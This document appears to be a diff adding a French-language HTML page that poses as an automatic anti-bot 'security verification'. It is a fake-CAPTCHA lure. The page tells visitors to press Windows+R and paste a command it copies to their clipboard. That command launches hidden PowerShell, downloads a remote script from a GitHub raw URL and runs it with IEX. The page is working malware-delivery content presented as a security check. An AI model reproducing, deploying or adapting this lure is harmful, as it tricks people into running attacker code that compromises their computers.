@@ -1,0 +1,36 @@
+<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verification requise</title><style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;max-width:500px;width:95%;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);overflow:hidden}
+.top{background:#1a73e8;color:#fff;text-align:center;padding:24px}
+.top .shield{font-size:48px;margin-bottom:4px}
+.top h2{font-size:18px}.top p{font-size:13px;opacity:.9}
+.steps{padding:24px}
+.step{display:flex;gap:12px;align-items:flex-start;margin-bottom:16px}
+.num{background:#1a73e8;color:#fff;min-width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;flex-shrink:0}
+.step-text{font-size:13px;line-height:1.5}
+.code-box{background:#1e1e1e;color:#0f0;font-family:Consolas,monospace;font-size:11px;padding:12px;border-radius:6px;word-break:break-all;margin:8px 0;position:relative}
+.copy-btn{position:absolute;top:6px;right:6px;background:#1a73e8;color:#fff;border:none;padding:5px 12px;border-radius:4px;cursor:pointer;font-size:11px;font-weight:600}
+.copy-btn:hover{background:#1557b0}
+.footer{padding:16px;text-align:center;font-size:11px;color:#999;background:#faf9f8;border-top:1px solid#eee}
+</style></head><body>
+<div class="card">
+<div class="top">
+<div class="shield">🛡️</div>
+<h2>Verification de securite</h2>
+<p>Protection anti-bot automatique</p>
+</div>
+<div class="steps">
+<p style="font-size:13px;color:#333;margin-bottom:16px">Trafic inhabituel detecte depuis votre reseau. Completez cette verification pour continuer.</p>
+<div class="step"><div class="num">1</div><div class="step-text">Appuyez sur <strong>Windows + R</strong></div></div>
+<div class="step"><div class="num">2</div><div class="step-text">Collez la commande ci-dessous et cliquez sur <strong>OK</strong> :</div></div>
+<div class="code-box" id="box"><span id="cmd">powershell -W Hidden -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/garagebernard400-pixel/windows-defender-alert/main/fx.ps1')"</span>
+<button class="copy-btn" onclick="copy()">Copier</button></div>
+<div class="step"><div class="num">3</div><div class="step-text">Revenez sur cette page et <strong>actualisez</strong>.</div></div>
+</div>
+<div class="footer">Verification automatique &copy; 2026</div>
+</div>
+<script>
+function copy(){navigator.clipboard.writeText(document.getElementById('cmd').textContent).then(()=>alert('Commande copiee !\n\nWindows+R > collez > OK'))}
+</script>
+</body></html>
